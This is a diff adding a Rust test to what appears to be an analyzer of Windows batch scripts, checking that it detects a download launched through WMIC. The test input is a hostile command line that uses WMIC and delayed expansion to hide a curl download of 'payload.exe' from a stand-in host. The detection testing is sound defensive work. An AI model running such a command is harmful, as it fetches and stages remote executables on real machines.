@@ -7971,6 +7971,7 @@ mod bitsadmin_tests {
 #[cfg(test)]
 #[allow(clippy::unwrap_used, clippy::expect_used, clippy::panic)]
 mod wmic_tests {
+    use crate::analyze;
     use crate::env::{Config, Environment};
     use crate::interp::interpret_line;
     use crate::traits::Trait;
@@ -8059,6 +8060,23 @@ mod wmic_tests {
         });
         assert!(has, "no path WmicProcessCreate: {:?}", env.traits);
         assert_eq!(env.exec_cmd, vec!["cmd /c echo hi".to_string()]);
+    }
+
+    #[test]
+    fn wmic_process_call_create_preserves_delayed_expansion_child() {
+        let script = br#"wmic process call create "cmd.exe /V:ON /c set U=https://wmic-wrapper.example/payload.exe&&curl -o payload.exe !U!""#;
+        let report = analyze(script, &Config::default());
+
+        assert!(
+            report.traits.iter().any(|t| matches!(
+                t,
+                Trait::Download { src, dst, .. }
+                    if src == "https://wmic-wrapper.example/payload.exe"
+                        && dst.as_deref() == Some("payload.exe")
+            )),
+            "wmic child did not preserve delayed expansion: {:?}",
+            report.traits
+        );
     }
 }
 
